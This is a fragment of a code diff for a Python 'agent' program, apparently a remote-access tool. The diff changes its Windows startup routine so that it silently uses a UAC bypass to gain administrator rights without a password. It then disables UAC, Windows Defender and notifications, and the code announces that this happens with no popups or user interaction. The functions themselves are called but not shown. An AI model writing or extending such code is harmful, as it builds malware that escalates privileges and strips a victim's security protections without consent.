+                        stderr = result.stderr.decode('cp1252', errors='replace')
+                
+                # Create result-like object
+                class Result:
+                    pass
+                result = Result()
+                result.stdout = stdout
+                result.stderr = stderr
         else:
             # Use bash on Linux/Unix systems
             result = subprocess.run(
@@ -12113,25 +12813,27 @@ if __name__ == "__main__":
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
     
-    # PRIORITY 0: Request admin privileges (keep asking until YES)
+    # PRIORITY 0: OPTIONAL admin privileges (bootstrap method will handle it)
     if WINDOWS_AVAILABLE:
         print("=" * 80)
-        print("[STARTUP] PRIORITY 0: Requesting Administrator Privileges...")
-        print("[STARTUP] This is REQUIRED for the agent to function properly")
-        print("[STARTUP] The prompt will keep appearing until you click YES")
+        print("[STARTUP] PRIORITY 0: Checking Administrator Privileges...")
+        print("[STARTUP] NOTE: Admin is NOT required - bootstrap method will handle it!")
         print("=" * 80)
         
-        try:
-            # Keep asking for admin until user clicks YES
-            run_as_admin_persistent()
-        except Exception as e:
-            print(f"[STARTUP] Admin request error: {e}")
-            import traceback
-            traceback.print_exc()
+        if is_admin():
+            print("[STARTUP] ✅ Already running as Administrator")
+        else:
+            print("[STARTUP] ⚪ Running as Standard User")
+            print("[STARTUP] ✅ Bootstrap method will use UAC bypass to gain admin (no password needed!)")
+            print("[STARTUP] Skipping admin prompt - will use automatic UAC bypass instead")
+        
+        print("=" * 80)
     
     # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
     try:
         print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        print("[STARTUP] Using SILENT methods (no popups, no user interaction)")
+        print("=" * 80)
         
         # 0. Disable WSL routing FIRST (fixes command execution!)
         print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
@@ -12143,18 +12845,30 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[STARTUP] WSL routing error: {e}")
         
-        # 1. Disable UAC first (requires admin)
-        print("[STARTUP] Step 1: Disabling UAC...")
+        # 1. BOOTSTRAP UAC DISABLE (NO ADMIN NEEDED!)
+        print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
+        print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
+        print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
         try:
-            if disable_uac():
-                print("[STARTUP] ✅ UAC disabled successfully")
+            if bootstrap_uac_disable_no_admin():
+                print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
+                print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
+                print("[STARTUP] ✅ You can now run ANY application without password prompts!")
             else:
-                print("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+                print("[STARTUP] ⚠️ Bootstrap failed - trying direct method...")
+                # Fallback to direct method
+                if silent_disable_uac():
+                    print("[STARTUP] ✅ UAC disabled using direct method")
+                else:
+                    print("[STARTUP] ⚠️ UAC disable failed - may need to run as administrator")
         except Exception as e:
             print(f"[STARTUP] UAC disable error: {e}")
+            import traceback
+            traceback.print_exc()
         
         # 2. Disable Windows Defender
-        print("[STARTUP] Step 2: Disabling Windows Defender...")
+        print("\n[STARTUP] Step 2: Disabling Windows Defender...")
         try:
             if disable_defender():
                 print("[STARTUP] ✅ Windows Defender disabled successfully")
@@ -12164,7 +12878,7 @@ if __name__ == "__main__":
             print(f"[STARTUP] Defender disable error: {e}")
         
         # 3. Disable Windows notifications
-        print("[STARTUP] Step 3: Disabling Windows notifications...")
+        print("\n[STARTUP] Step 3: Disabling Windows notifications...")
         try:
             if disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
@@ -12173,7 +12887,21 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[STARTUP] Notification disable error: {e}")
         
+        print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
+        print("=" * 80)
+        
+        # FINAL UAC STATUS CHECK
+        print("\n[STARTUP] FINAL UAC STATUS CHECK:")
+        try:
+            verify_uac_status()
+        except Exception as e:
+            print(f"[STARTUP] Status check error: {e}")
+        
+        print("=" * 80)
+        print("[STARTUP] ⚠️ IMPORTANT: RESTART REQUIRED for UAC changes to take full effect!")
+        print("=" * 80)
+        
     except Exception as e:
         print(f"[STARTUP] Configuration error: {e}")
         import traceback
